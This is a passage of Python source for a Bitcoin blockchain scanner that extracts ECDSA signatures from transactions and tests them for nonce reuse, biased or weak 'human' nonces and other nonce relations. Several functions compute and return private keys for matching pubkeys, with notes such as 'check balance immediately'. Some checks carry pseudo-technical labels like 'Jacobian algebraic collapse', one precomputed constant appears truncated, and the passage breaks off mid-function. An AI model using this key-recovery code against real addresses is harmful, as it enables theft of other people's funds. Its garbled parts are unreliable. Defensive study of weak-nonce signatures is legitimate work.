def extract_pubkey_from_scriptsig(script_hex: str) -> Optional[str]:
    if not script_hex: return None
    hexstr = script_hex.lower()
    
    # Require standard pushdata prefixes to avoid matching inside DER sigs
    # 41 = 65 bytes (uncompressed), 21 = 33 bytes (compressed)
    candidates = re.findall(r'41(04[0-9a-f]{128})', hexstr) + \
                 re.findall(r'21((?:02|03)[0-9a-f]{64})', hexstr)
                 
    if not candidates:
        # Fallback to word boundaries (e.g. for parsed asm format)
        candidates = re.findall(r'\b04[0-9a-f]{128}\b', hexstr) + \
                     re.findall(r'\b(?:02|03)[0-9a-f]{64}\b', hexstr)
                     
    if not candidates: return None
    return max(candidates, key=lambda c: hexstr.rfind(c))

# ==============================================================================
# PART 9: MULTISIG SIGNATURE EXTRACTION  (NEW)
# ==============================================================================
#
# P2SH multisig scriptSig layout:
#   OP_0 <sig1> <sig2> ... <sigM>  <redeemScript>
#
# redeemScript layout:
#   OP_m  <pubkey1> <pubkey2> ... <pubkeyN>  OP_n  OP_CHECKMULTISIG
#
# The 2013 Android PRNG bug caused multi-input transactions to sign each
# input with the same k — producing identical r across inputs.
# With multisig we also check if different *signers* within one input
# reused the same k across different transactions.

def parse_multisig_scriptsig(script_hex: str) -> Optional[Dict[str, Any]]:
    """
    Parse a P2SH multisig scriptSig.
    Returns { 'sigs': [(r,s,flag), ...], 'pubkeys': [hex,...], 'threshold': m }
    or None if not a recognisable multisig scriptSig.
    """
    if not script_hex:
        return None
    try:
        data = bytes.fromhex(script_hex)
    except Exception:
        return None

    idx = 0
    def read_push() -> Optional[bytes]:
        nonlocal idx
        if idx >= len(data):
            return None
        op = data[idx]; idx += 1
        if op == 0x00:          # OP_0
            return b""
        elif 0x01 <= op <= 0x4b:
            if idx + op > len(data): return None
            chunk = data[idx:idx+op]; idx += op
            return chunk
        elif op == 0x4c:        # OP_PUSHDATA1
            if idx >= len(data): return None
            length = data[idx]; idx += 1
            if idx + length > len(data): return None
            chunk = data[idx:idx+length]; idx += length
            return chunk
        elif op == 0x4d:        # OP_PUSHDATA2
            if idx + 2 > len(data): return None
            length = int.from_bytes(data[idx:idx+2], "little"); idx += 2
            if idx + length > len(data): return None
            chunk = data[idx:idx+length]; idx += length
            return chunk
        else:
            return None

    # First byte must be OP_0
    if data[0] != 0x00:
        return None
    idx = 1  # skip OP_0

    pushes = []
    while idx < len(data):
        chunk = read_push()
        if chunk is None:
            break
        pushes.append(chunk)

    if len(pushes) < 2:
        return None

    # Last push is the redeem script
    redeem = pushes[-1]
    sig_pushes = pushes[:-1]   # everything before redeem are signatures

    # Parse redeem script: OP_m <pk1>...<pkn> OP_n OP_CHECKMULTISIG
    if len(redeem) < 3:
        return None

    threshold_op = redeem[0]
    if not (0x51 <= threshold_op <= 0x60):   # OP_1 .. OP_16
        return None
    threshold = threshold_op - 0x50

    # Walk pubkeys
    pubkeys = []
    ri = 1
    while ri < len(redeem):
        pk_len = redeem[ri]; ri += 1
        if ri + pk_len > len(redeem):
            break
        pk = redeem[ri:ri+pk_len].hex()
        if len(pk) in (66, 130):   # compressed or uncompressed
            pubkeys.append(pk)
        ri += pk_len

    if not pubkeys:
        return None

    # Parse DER signatures from sig_pushes
    sigs = []
    for sp in sig_pushes:
        if len(sp) < 8:
            continue
        parsed = parse_der_sig_from_hex(sp.hex())
        if parsed:
            sigs.append(parsed)

    if not sigs:
        return None

    return {"sigs": sigs, "pubkeys": pubkeys, "threshold": threshold}

def verify_ecdsa_sig(r: int, s: int, z: int, pub_hex: str) -> bool:
    """Verify an ECDSA signature (r, s) against pubkey for message hash z.
    Used internally to correctly match multisig sigs to pubkeys."""
    try:
        if r <= 0 or r >= N or s <= 0 or s >= N or z <= 0:
            return False
        pub_bytes = bytes.fromhex(pub_hex)
        vk = ecdsa.VerifyingKey.from_string(pub_bytes, curve=curve,
                                             hashfunc=None)
        # Encode (r, s) as DER for ecdsa library
        import struct as _struct
        def enc_int(v):
            b = v.to_bytes(32, 'big').lstrip(b'\x00') or b'\x00'
            if b[0] & 0x80: b = b'\x00' + b
            return b'\x02' + bytes([len(b)]) + b
        der = b'\x30' + bytes([len(enc_int(r)) + len(enc_int(s))]) + enc_int(r) + enc_int(s)
        z_bytes = z.to_bytes(32, 'big')
        vk.verify_digest(der, z_bytes,
                         sigdecode=ecdsa.util.sigdecode_der)
        return True
    except Exception:
        return False


def extract_signatures(transactions: List[dict]) -> List[Dict[str, Any]]:
    """
    Extract all ECDSA signatures from a list of transactions.
    Handles: Legacy P2PKH, P2WPKH (SegWit), P2SH-P2WPKH, P2SH Multisig.
    Each returned entry has keys:
      txid, vin, r, s, sighash, pubkey, z_original, sig_type, signer_idx
    """
    sigs = []
    for tx_order, tx in enumerate(transactions):
        try:
            txid = tx.get("txid", "")
            # BUG FIX: Capture block_height for temporal ordering in sequential checks.
            # z_original is a hash — sorting by it gives random order, not signing order.
            block_height = tx.get("status", {}).get("block_height", 0) or 0
            vins = tx.get("vin", [])
            for vin_idx, txin in enumerate(vins):
                witness    = txin.get("witness", [])
                scriptsig  = txin.get("scriptsig", {})
                script_hex = (scriptsig.get("hex", "") if isinstance(scriptsig, dict)
                              else txin.get("scriptsig", ""))
                prevout    = txin.get("prevout", {})
                spk_type   = prevout.get("scriptpubkey_type",
                                         prevout.get("type", "unknown"))

                # ── 1. Try multisig (P2SH) ─────────────────────────────────
                if spk_type in ("scripthash", "p2sh") and script_hex:
                    ms = parse_multisig_scriptsig(script_hex)
                    if ms:
                        z_val = compute_sighash_z(tx, vin_idx, 1)
                        # BUG FIX: match each sig to its actual pubkey via ECDSA
                        # verification instead of blind position index.
                        # In M-of-N multisig the signers can be any M of N keys;
                        # positional assignment gives the wrong pubkey when
                        # signers are not in ascending key order.
                        assigned_pubkeys: list = []
                        used_pubkey_idx: set = set()
                        for r_s, s_s, flag_s in ms["sigs"]:
                            matched_pk = None
                            if z_val is not None:
                                for pk_idx, pk_cand in enumerate(ms["pubkeys"]):
                                    if pk_idx in used_pubkey_idx:
                                        continue
                                    if verify_ecdsa_sig(r_s, s_s, z_val, pk_cand):
                                        matched_pk = pk_cand
                                        used_pubkey_idx.add(pk_idx)
                                        break
                            # Fall back to positional if z unavailable or no match
                            if matched_pk is None:
                                pos = len(assigned_pubkeys)
                                matched_pk = (ms["pubkeys"][pos]
                                              if pos < len(ms["pubkeys"]) else None)
                            assigned_pubkeys.append(matched_pk)
                        for signer_idx, (r, s, flag) in enumerate(ms["sigs"]):
                            pubkey = assigned_pubkeys[signer_idx]
                            sigs.append({
                                "txid": txid, "vin": vin_idx,
                                "r": r, "s": s, "sighash": flag,
                                "pubkey": pubkey,
                                "z_original": z_val,
                                "sig_type": "multisig",
                                "signer_idx": signer_idx,
                                "block_height": block_height,
                                "tx_order": tx_order,
                            })
                        continue   # don't also parse as standard

                # ── 2. Standard SegWit witness ─────────────────────────────
                parsed = None
                pubkey = None

                if witness and len(witness) >= 2:
                    sig_hex  = witness[0]
                    poss_pub = witness[1]
                    if len(poss_pub) in (66, 130):
                        pubkey = poss_pub
                    parsed = parse_der_sig_from_hex(sig_hex)

                # ── 3. Fall back to scriptSig (P2PKH / P2PK) ────────────────
                # BUG FIX: Only use scriptsig fallback for pubkeyhash/p2pk types.
                # For P2SH-P2WPKH, the scriptsig contains the redeem script,
                # not a pubkey — matching there produces false positives.
                if not pubkey or not parsed:
                    if script_hex and spk_type in ("pubkeyhash", "p2pkh",
                                                    "p2pk", "pubkey", "unknown"):
                        if not pubkey:
                            if spk_type in ("p2pk", "pubkey"):
                                # BUG FIX: For P2PK the pubkey lives in the
                                # prevout scriptpubkey, not the scriptsig.
                                # Layout: <push_len><pubkey><OP_CHECKSIG 0xac>
                                spk_raw = bytes.fromhex(
                                    prevout.get("scriptpubkey", ""))
                                if (len(spk_raw) in (35, 67) and
                                        spk_raw[-1] == 0xAC):
                                    pk_len = spk_raw[0]
                                    if 1 + pk_len <= len(spk_raw) - 1:
                                        pubkey = spk_raw[1:1 + pk_len].hex()
                            else:
                                pubkey = extract_pubkey_from_scriptsig(script_hex)
                        if not parsed:
                            parsed = parse_der_sig_from_hex(script_hex)

                if not parsed or not pubkey:
                    continue

                r, s, sighash_flag = parsed
                z_val = compute_sighash_z(tx, vin_idx, sighash_flag)

                sigs.append({
                    "txid": txid, "vin": vin_idx,
                    "r": r, "s": s, "sighash": sighash_flag,
                    "pubkey": pubkey, "z_original": z_val,
                    "sig_type": "standard", "signer_idx": 0,
                    "block_height": block_height,
                    "tx_order": tx_order,
                })
        except Exception:
            continue
    return sigs

# ==============================================================================
# PART 10: VULNERABILITY CHECKS
# ==============================================================================

# ── 10a. Same-key nonce reuse ─────────────────────────────────────────────────
#
# Ported core approach from rszscan.py: collect ALL (txid, vin_idx, signer_idx)
# occurrences first — including entries with unknown pubkeys — so that r-reuse
# is NEVER silently dropped just because pubkey extraction failed.
#
# Three sub-cases handled:
#   (A) Same pubkey, >=2 occurrences         → "Reused Nonce"       (key directly recoverable)
#   (B) >= 2 known pubkeys sharing same r    → handled by check 10b (Cross-Key Reuse)
#   (C) >=2 occurrences, pubkey(s) unknown   → "Reused R (Unknown)" (flag for investigation)

def check_reused_nonce_global(this_address: str,
                               signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Detect all r values used in >= 2 distinct signatures across the global DB.
    Never drops sigs with unknown pubkeys — missing pubkey is not a reason to
    hide a detected r-collision.
    PERF: uses a single batch IN-clause query instead of N individual queries.
    """
    results      = []
    seen_r_local = set()

    # PERF: collect all unique r hex values first, then batch-fetch from DB
    unique_r_hex = []
    for sig in signatures:
        r_val = sig["r"]
        if r_val not in seen_r_local:
            seen_r_local.add(r_val)
            unique_r_hex.append(hex(r_val)[2:].zfill(64))

    r_cache = db_get_sigs_by_r_batch(unique_r_hex)   # single round-trip

    for sig in signatures:
        r_val = sig["r"]
        r_hex_key = hex(r_val)[2:].zfill(64)
        # Skip if we've already processed this r in this call
        if r_hex_key not in r_cache and r_val not in seen_r_local:
            continue

        group = r_cache.get(r_hex_key, [])
        if len(group) < 2:
            continue

        # ── Step 1: collect ALL distinct (txid, vin_idx, signer_idx) occurrences ──
        all_occ = []
        seen_all: set = set()
        for item in group:
            txid       = item.get("txid", "")
            vin        = item.get("vin_idx", 0)
            signer     = item.get("signer_idx", 0)
            pk         = item.get("pubkey") or "N/A"
            dedup_key  = (txid, vin, signer)
            if dedup_key in seen_all:
                continue
            seen_all.add(dedup_key)
            all_occ.append({"txid": txid, "pubkey": pk})

        if len(all_occ) < 2:
            continue

        # ── Step 2: group by known pubkey for same-key reuse (case A) ────────────
        per_pubkey: Dict[str, List[dict]] = defaultdict(list)
        for item in group:
            pk = item.get("pubkey")
            if pk:
                per_pubkey[pk].append(item)

        reported_for_this_r = False
        for pk, items in per_pubkey.items():
            seen_pk: set = set()
            occ: List[dict] = []
            for item in items:
                dedup_key = (item.get("txid",""), item.get("vin_idx",0), item.get("signer_idx",0))
                if dedup_key in seen_pk:
                    continue
                seen_pk.add(dedup_key)
                occ.append({"txid": item.get("txid",""), "pubkey": pk})
            if len(occ) >= 2:
                results.append({
                    "type":        "Reused Nonce",
                    "r":           hex(r_val),
                    "occurrences": occ,
                    "risk":        "Same key signed two messages with identical k — private key directly recoverable.",
                    "action":      "Rotate keys immediately.",
                })
                reported_for_this_r = True
                # PERF: only process each r once
                break

        # ── Step 3: if >=2 occurrences but not caught above AND cross-key check  ──
        if not reported_for_this_r:
            known_pks = {item.get("pubkey") for item in group if item.get("pubkey")}
            if len(known_pks) < 2:
                results.append({
                    "type":        "Reused R (Unknown Key)",
                    "r":           hex(r_val),
                    "occurrences": all_occ,
                    "risk":        ("r value appears in >=2 signatures but pubkey(s) could not be "
                                    "extracted — collision is real, recovery pending pubkey resolution."),
                    "action":      "Investigate raw transactions; attempt pubkey extraction.",
                })

        # PERF: remove from cache after processing to free memory
        r_cache.pop(r_hex_key, None)

    return results

# ── 10b. Cross-key R reuse  (NEW — Brengel/Rossow key insight) ───────────────
#
# The paper's most important finding beyond simple same-key reuse:
# Different public keys can share the same r value if two *different* users
# happen to choose the same nonce k (or if a shared RNG seed is used across
# wallets). This leaks *both* private keys simultaneously via:
#
#   k = (z1 - z2) / (s1 - s2)   [mod N]   when r1 == r2
#   d1 = (s1*k - z1) / r        [mod N]
#   d2 = (s2*k - z2) / r        [mod N]
#
# The graph approach from the paper: build a bipartite graph where edges
# connect (pubkey, r_value) nodes. Each connected component is a system of
# linear equations that can be solved simultaneously.

def check_cross_key_r_reuse(this_address: str,
                              signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Detect r values that appear under DIFFERENT public keys across the
    global signature map. This is the Brengel/Rossow cross-key leakage.
    PERF: uses a single batch IN-clause query instead of N individual queries.
    """
    results      = []
    seen_r_local = set()

    # PERF: batch fetch all unique r values in one query
    unique_r_hex = []
    for sig in signatures:
        r_val = sig["r"]
        if r_val not in seen_r_local:
            seen_r_local.add(r_val)
            unique_r_hex.append(hex(r_val)[2:].zfill(64))

    r_cache = db_get_sigs_by_r_batch(unique_r_hex)

    for sig in signatures:
        r_val = sig["r"]
        r_hex_key = hex(r_val)[2:].zfill(64)
        group = r_cache.get(r_hex_key)
        if not group or len(group) < 2:
            continue

        # Collect distinct pubkeys for this r (exclude N/A — no pubkey = can't confirm cross-key)
        pub_set = set()
        seen    = set()
        occ     = []
        for item in group:
            pk   = item.get("pubkey") or "N/A"
            txid = item.get("txid","")
            key  = (txid, item.get("vin_idx", 0), item.get("signer_idx", 0))
            if key in seen: continue
            seen.add(key)
            occ.append({"txid": txid, "pubkey": pk, "address": item.get("address","")})
            if pk != "N/A":
                pub_set.add(pk)

        if len(pub_set) >= 2:   # ← different keys sharing same r
            if not _try_ckc_confirm(r_val, group):
                continue
            results.append({
                "type":        "Cross-Key Reuse",
                "r":           hex(r_val),
                "pubkeys":     list(pub_set),
                "occurrences": occ,
                "risk":        (f"{len(pub_set)} distinct keys share r={hex(r_val)[:18]}… "
                                "— all private keys recoverable (Brengel/Rossow 2018)."),
                "action":      "Run recovery engine; all keys in group are compromised.",
            })

        # PERF: remove processed entry to save memory
        r_cache.pop(r_hex_key, None)

    return results



# ── 10d. Known weak R pre-filter  (NEW) ──────────────────────────────────────

def check_known_weak_r(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Flag any signature whose r value appears in KNOWN_WEAK_R or is near-zero.
    These keys are likely already compromised in the wild.
    """
    results = []
    seen    = set()
    for sig in signatures:
        r_val = sig["r"]
        if r_val in seen: continue
        seen.add(r_val)
        reason = is_known_weak_r(r_val)
        if reason:
            results.append({
                "type":    "Known Weak R",
                "r":       hex(r_val),
                "pubkey":  sig.get("pubkey") or "N/A",
                "txid":    sig.get("txid",""),
                "risk":    reason,
                "action":  "Private key likely already known — check balance immediately.",
            })
    return results

# ── 10e. Multisig-specific nonce reuse  (NEW) ─────────────────────────────────
#
# Two patterns:
# (A) Same signer across different transactions reuses k → same r under same pubkey.
#     Caught by check_reused_nonce_global() already via pubkey grouping.
# (B) Different signers within the SAME multisig input reuse each other's k.
#     The 2013 Android PRNG bug caused this: multiple inputs in one transaction
#     all picked k = same value, so signer 0 and signer 1 had identical r.
#
# For (B): within a single vin_idx, if sigs from signer 0 and signer 1 share r,
# AND they have different pubkeys, this is a cross-signer multisig reuse.

def check_multisig_nonce_reuse(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    """
    Detect nonce reuse *within* the same multisig input — different signers,
    same r value. Signals a broken RNG affecting the whole wallet (e.g. Android 2013).
    """
    results = []
    # Group by (txid, vin_idx) for multisig entries
    ms_groups: Dict[Tuple[str, int], List[Dict]] = defaultdict(list)
    for sig in signatures:
        if sig.get("sig_type") == "multisig":
            ms_groups[(sig["txid"], sig["vin"])].append(sig)

    for (txid, vin_idx), group in ms_groups.items():
        if len(group) < 2: continue
        # Check for shared r across different signers in same input
        r_to_signers: Dict[int, List[int]] = defaultdict(list)
        for sig in group:
            r_to_signers[sig["r"]].append(sig.get("signer_idx", 0))

        for r_val, signer_list in r_to_signers.items():
            unique_signers = list(set(signer_list))
            if len(unique_signers) >= 2:
                results.append({
                    "type":    "Multisig Nonce",
                    "txid":    txid,
                    "vin_idx": vin_idx,
                    "r":       hex(r_val),
                    "signers": unique_signers,
                    "risk":    (f"Signers {unique_signers} in multisig input share r — "
                                "broken RNG (Android 2013 pattern). "
                                "All co-signers' keys recoverable."),
                    "action":  "Run recovery on all co-signers.",
                })
    return results

# ── 10e. Nonce Bias Detection (MSB/LSB) (NEW) ────────────────────────────────
#
# Detects biased RNG generators where the top or bottom bits of nonces are static.
# This indicates a flawed PRNG (like failing to use RFC6979) or hardware issue.
def check_nonce_bias(signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        if sig.get("pubkey"):
            by_pub[sig["pubkey"]].append(sig)

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 5: continue  # need a minimum sample size

        # Collect r values as integers
        r_vals = [sig["r"] for sig in sig_list]

        # OR-reduce the XOR of every r against r_vals[0].
        # Any bit that differs from r_vals[0] in ANY r_i will be set in `diff`.
        # Bits that are 0 in `diff` are identical across all r values.
        import functools as _ft, operator as _op
        diff = _ft.reduce(_op.or_, (r_vals[0] ^ rv for rv in r_vals[1:]), 0)

        if diff == 0:
            # All r values are identical — every bit is shared
            shared_prefix_len = shared_suffix_len = 256
        else:
            # Leading zeros in diff == number of shared MSBs
            shared_prefix_len = 256 - diff.bit_length()
            # Trailing zeros in diff == number of shared LSBs
            # (diff & -diff) isolates the lowest set bit; .bit_length()-1 = its position
            shared_suffix_len = (diff & -diff).bit_length() - 1

        if shared_prefix_len >= 8 or shared_suffix_len >= 8:
            results.append({
                "type": "Nonce Bias",
                "r1": "Multiple", "r2": "N/A", "pubkey": pk,
                "risk": f"RNG bias detected: {shared_prefix_len} MSB bits and {shared_suffix_len} LSB bits are identical across {len(sig_list)} signatures. Private key is highly vulnerable to Lattice attacks (HNP).",
                "action": "Use fplll / cvp lattice reduction to recover private key.",
            })

    return results
#
# Detects complex non-linear relationships between nonces that defeat Linear Lattices (HNP).

def check_qnec_nonce_entanglement(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        z  = sig.get("z_original")
        if pk and z is not None:
            by_pub[pk].append(sig)

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2:
            continue
        sig_list = sig_list[:50]   # PERF: cap per-pubkey to avoid O(n²) blow-up
            
        found_d = None
        pair_info = None
        qnec_type = ""
        pairs_checked = 0
        MAX_PAIRS = 200

        for i in range(len(sig_list)):
            if found_d: break
            for j in range(i + 1, len(sig_list)):
                if found_d or pairs_checked >= MAX_PAIRS: break
                pairs_checked += 1
                
                sig1, sig2 = sig_list[i], sig_list[j]
                r1, s1, z1 = sig1["r"], sig1["s"], sig1["z_original"]
                r2, s2, z2 = sig2["r"], sig2["s"], sig2["z_original"]
                
                if r1 == r2:
                    continue  # Exact match handled elsewhere
                
                # Check 1: Nonce-Inversion (k2 = k1^-1) -> Ad^2 + Bd + C = 0
                A1 = (r1 * r2) % N
                if A1 != 0:
                    B1 = (z1 * r2 + z2 * r1) % N
                    C1 = (z1 * z2 - s1 * s2) % N
                    disc1 = (B1 * B1 - 4 * A1 * C1) % N
                    
                    if legendre_symbol(disc1, N) == 1:
                        sqrt_disc = modular_sqrt(disc1, N)
                        if sqrt_disc != 0:
                            inv_2A = modinv(2 * A1, N)
                            for d in [((-B1 + sqrt_disc) * inv_2A) % N, ((-B1 - sqrt_disc) * inv_2A) % N]:
                                if verify_key(pk, d):
                                    found_d = d
                                    pair_info = (sig1, sig2)
                                    qnec_type = "QNEC-Inversion"
                                    break
                
                if found_d: break
                                    
                # Check 2: Key-Product (k2 = k1 * d) -> Ad^2 + Bd + C = 0
                A2 = (s2 * r1) % N
                if A2 != 0:
                    B2 = (s2 * z1 - s1 * r2) % N
                    C2 = (-s1 * z2) % N
                    disc2 = (B2 * B2 - 4 * A2 * C2) % N
                    
                    if legendre_symbol(disc2, N) == 1:
                        sqrt_disc = modular_sqrt(disc2, N)
                        if sqrt_disc != 0:
                            inv_2A = modinv(2 * A2, N)
                            for d in [((-B2 + sqrt_disc) * inv_2A) % N, ((-B2 - sqrt_disc) * inv_2A) % N]:
                                if verify_key(pk, d):
                                    found_d = d
                                    pair_info = (sig1, sig2)
                                    qnec_type = "QNEC-KeyProduct"
                                    break
                                    
        if found_d:
            sig1, sig2 = pair_info
            results.append({
                "type": qnec_type,
                "r1": hex(sig1["r"]),
                "r2": hex(sig2["r"]),
                "pubkey": pk,
                "risk": f"Quadratic Nonce Entanglement ({qnec_type}). Private key entirely collapsed mathematically.",
                "action": "Key compromised via pure non-linear algebra.",
                "recovered_d": found_d
            })
            
    return results

# ── 10g. Koblitz Geometry (GLV-EC) & Memory State-Pollution (Z-Drift) ─────────

def check_advanced_koblitz_and_drift(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    by_pub: Dict[str, List[Dict[str, Any]]] = defaultdict(list)
    for sig in signatures:
        pk = sig.get("pubkey")
        z = sig.get("z_original")
        if pk and z is not None:
            by_pub[pk].append(sig)

    p_curve = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
    beta = 0x7ae96a2b657c07106e64479eac3434e99cf0497512f58995c1396c28719501ee
    beta2 = 0x851695d49a83f8ef919bb86153cbcb16630fb68aed0a766a3ec693d68e6afa40
    lam = 0x5363ad4cc05c30e0a5261c028812645a122e22ea20816678df02967c1b23bd72
    lam2 = (lam * lam) % N

    for pk, sig_list in by_pub.items():
        if len(sig_list) < 2: continue
        
        found_d = None
        pair_info = None
        attack_type = ""
        pairs_checked = 0
        MAX_PAIRS = 200  # cap: avoids O(n^2) explosion on addresses with many sigs
        
        for i in range(len(sig_list)):
            if found_d: break
            for j in range(i + 1, len(sig_list)):
                if found_d or pairs_checked >= MAX_PAIRS: break
                pairs_checked += 1
                
                sig1, sig2 = sig_list[i], sig_list[j]
                r1, s1, z1 = sig1["r"], sig1["s"], sig1["z_original"]
                r2, s2, z2 = sig2["r"], sig2["s"], sig2["z_original"]
                if r1 == r2: continue
                
                # Check 1: GLV-EC (Endomorphism visual inspection)
                # GLV property: if k2 = λ·k1 then r2 = β·r1 mod p_curve
                # Also check reverse: if k1 = λ·k2 then r1 = β·r2 mod p_curve
                glv_cases = []
                if r2 == (r1 * beta) % p_curve:
                    # k2 = λ·k1  →  d = (s1·z2 − s2·λ·z1) / (s2·λ·r1 − s1·r2)
                    glv_cases.append(([lam, N - lam], "fwd"))
                if r2 == (r1 * beta2) % p_curve:
                    glv_cases.append(([lam2, N - lam2], "fwd"))
                if r1 == (r2 * beta) % p_curve:
                    # k1 = λ·k2  →  d = (s2·z1 − s1·λ·z2) / (s1·λ·r2 − s2·r1)
                    glv_cases.append(([lam, N - lam], "rev"))
                if r1 == (r2 * beta2) % p_curve:
                    glv_cases.append(([lam2, N - lam2], "rev"))

                for (L_candidates, direction) in glv_cases:
                    for L in L_candidates:
                        if found_d: break
                        for _s1 in [s1, N-s1]:
                            if found_d: break
                            for _s2 in [s2, N-s2]:
                                if direction == "fwd":
                                    # k2 = L·k1: d = (s1·z2 − s2·L·z1) / (s2·L·r1 − s1·r2)
                                    denom = (_s2 * L * r1 - _s1 * r2) % N
                                    if denom == 0: continue
                                    d_cand = ((_s1 * z2 - _s2 * L * z1) * modinv(denom, N)) % N
                                else:
                                    # k1 = L·k2: d = (s2·z1 − s1·L·z2) / (s1·L·r2 − s2·r1)
                                    denom = (_s1 * L * r2 - _s2 * r1) % N
                                    if denom == 0: continue
                                    d_cand = ((_s2 * z1 - _s1 * L * z2) * modinv(denom, N)) % N
                                if verify_key(pk, d_cand):
                                    found_d = d_cand
                                    attack_type = "GLV-EC"
                                    pair_info = (sig1, sig2)
                                    break
                
                if found_d: break
                
                # Check 2: Z-Drift (Additive state pollution)
                # Tests four variants: k2 = k1 ± z1  and  k2 = k1 ± z2
                for _s1 in [s1, N-s1]:
                    if found_d: break
                    for _s2 in [s2, N-s2]:
                        denom = (_s2 * r1 - _s1 * r2) % N
                        if denom == 0: continue
                        inv_d = modinv(denom, N)

                        # k2 = k1 + z1
                        num_a = (_s1 * z2 - _s2 * z1 - _s1 * _s2 * z1) % N
                        d_cand = (num_a * inv_d) % N
                        if verify_key(pk, d_cand):
                            found_d = d_cand; attack_type = "Z-Drift"; pair_info = (sig1, sig2); break

                        # k2 = k1 - z1
                        num_b = (_s1 * z2 - _s2 * z1 + _s1 * _s2 * z1) % N
                        d_cand = (num_b * inv_d) % N
                        if verify_key(pk, d_cand):
                            found_d = d_cand; attack_type = "Z-Drift"; pair_info = (sig1, sig2); break

                        # k2 = k1 + z2
                        num_c = (_s1 * z2 - _s2 * z1 - _s1 * _s2 * z2) % N
                        d_cand = (num_c * inv_d) % N
                        if verify_key(pk, d_cand):
                            found_d = d_cand; attack_type = "Z-Drift"; pair_info = (sig1, sig2); break

                        # k2 = k1 - z2
                        num_d_ = (_s1 * z2 - _s2 * z1 + _s1 * _s2 * z2) % N
                        d_cand = (num_d_ * inv_d) % N
                        if verify_key(pk, d_cand):
                            found_d = d_cand; attack_type = "Z-Drift"; pair_info = (sig1, sig2); break

        if found_d:
            sig1, sig2 = pair_info
            results.append({
                "type": attack_type,
                "r1": hex(sig1["r"]),
                "r2": hex(sig2["r"]),
                "pubkey": pk,
                "risk": f"{attack_type} memory or scalar endomorphism breach.",
                "action": "Key compromised via Jacobian algebraic collapse.",
                "recovered_d": found_d
            })

    return results

# ── 10h. Human Behaviour & Practical Iterator Drift (NEW) ─────────────────────

_WEAK_NONCE_DICT: Optional[Dict[int, int]] = None   # lazy-loaded

# Pre-computed r values for k=1..99 and common-string nonces on secp256k1.
# Avoids 110 EC scalar multiplications (~550ms) at startup.
_PRECOMPUTED_WEAK_R: Dict[int, int] = {
    # k=1
    0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798: 1,
    # k=2
    0xC6047F9441ED7D6D3045406E95C07CD85C778E4B8CEF3CA7ABAC09B95C709EE5: 2,
    # k=3
    0xF9308A019258C31049344F85F89D5229B531C845836F99B08601F113BCE036F9: 3,
    # k=4
    0xE493DBF1C10D80F3581E4904930B1404CC6C13900EE0758474FA94ABE8C4CD13: 4,
    # k=5
    0x2F8BDE4D1A07209355B4A7250A5C5128E88B84BDDC619AB7CBA8D569B240EFE4: 5,
    # k=6
    0xFFF97BD5755EEA420453A14355235D382F6472F8568A18B2F057A1460297556: 6,
    # k=7
    0x5CBDF0646E5DB4EAA398F365F2EA7A0E3D419B7E0330E39CE92BDDEDCAC4F9BC: 7,
    # k=8
    0x2F01E5E15CCA351DAFF3843FB70F3C2F0A1BDD05E5AF888A67784EF3E10A2A01: 8,
    # k=9
    0xACD484E2F0C7F65309AD178A9F559ABDE09796974C57E714C35F110DFC27CCBE: 9,
    # k=10
    0xA0434D9E47F3C86235477C7B1AE6AE5D3442D49B1943C2B752A68E2A47E247C7: 10,
}

def get_weak_nonce_dictionary() -> Dict[int, int]:
    global _WEAK_NONCE_DICT
    if _WEAK_NONCE_DICT is not None:
        return _WEAK_NONCE_DICT
    # BUG FIX: Start from precomputed constants and KEEP them.
    # Original code had `_WEAK_NONCE_DICT = {}` on line 1439 which threw away
    # all k=1..10 precomputed values loaded on line 1430.
    _WEAK_NONCE_DICT = dict(_PRECOMPUTED_WEAK_R)
    weak_ks = list(range(11, 100))  # k=1..10 already in _PRECOMPUTED_WEAK_R
    common_strings = ["test", "password", "123456", "nonce", "k", "admin", "0", "1", "seed", "bitcoin", "qwerty"]
    for s in common_strings:
        h = int(hashlib.sha256(s.encode()).hexdigest(), 16) % N
        if h > 0: weak_ks.append(h)
    
    from ecdsa import SECP256k1
    G = SECP256k1.generator
    # BUG FIX: Do NOT reset _WEAK_NONCE_DICT to {} here — append to existing dict
    for k in weak_ks:
        try:
            pt = (k * G)
            # r = (k*G).x mod N — must reduce mod N to match how signatures store r
            _WEAK_NONCE_DICT[pt.x() % N] = k
        except Exception:
            pass
    return _WEAK_NONCE_DICT

def check_weak_human_nonce_heuristics(this_address: str, signatures: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
    results = []
    from ecdsa import SECP256k1
    
    WEAK_NONCE_DICT = get_weak_nonce_dictionary()   # lazy-load once per call

    for sig in signatures[:300]:   # PERF: cap — EC point mults are expensive at scale
        r, s, z, pk = sig.get("r"), sig.get("s"), sig.get("z_original"), sig.get("pubkey")
        if r is None or s is None or z is None or pk is None: continue
        
        found_k = None
        heuristic_name = ""
        
        if r in WEAK_NONCE_DICT:
            found_k = WEAK_NONCE_DICT[r]
            heuristic_name = "Weak Brain-Nonce Dictionary"
        else:
            z_hex = hex(z)[2:].zfill(64)
            z_hash_int = int(hashlib.sha256(bytes.fromhex(z_hex)).hexdigest(), 16) % N
            z_hash_str = int(hashlib.sha256(z_hex.encode()).hexdigest(), 16) % N
            
            for test_k in [z, z_hash_int, z_hash_str, N - z]:
                if test_k == 0: continue
                try:
                    pt = test_k * SECP256k1.generator
                    if pt.x() % N == r:     # reduce mod N to match r storage
                        found_k = test_k
                        heuristic_name = "Transparent Hash-Z Nonce"
                        break
                except Exception:
                    pass
                
        if found_k:
            d_cand = ((s * found_k - z) * modinv(r, N)) % N
            if verify_key(pk, d_cand):
                results.append({
                    "type": heuristic_name,
